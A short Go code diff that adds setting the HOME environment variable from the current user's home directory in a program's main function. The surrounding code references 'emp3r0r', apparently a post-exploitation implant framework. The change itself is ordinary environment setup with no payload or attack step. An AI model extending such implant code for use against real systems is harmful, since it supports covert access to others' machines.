@@ -9,6 +9,7 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"os/user"
 	"strings"
 	"time"
 
@@ -50,6 +51,13 @@ func main() {
 
 	// PATH
 	os.Setenv("PATH", "/bin:/usr/bin:/usr/local/bin")
+	// HOME
+	u, err := user.Current()
+	if err != nil {
+		log.Printf("Get user info: %v", err)
+	} else {
+		os.Setenv("HOME", u.HomeDir)
+	}
 
 	// mkdir -p
 	if !util.IsFileExist(emp3r0r_data.UtilsPath) {
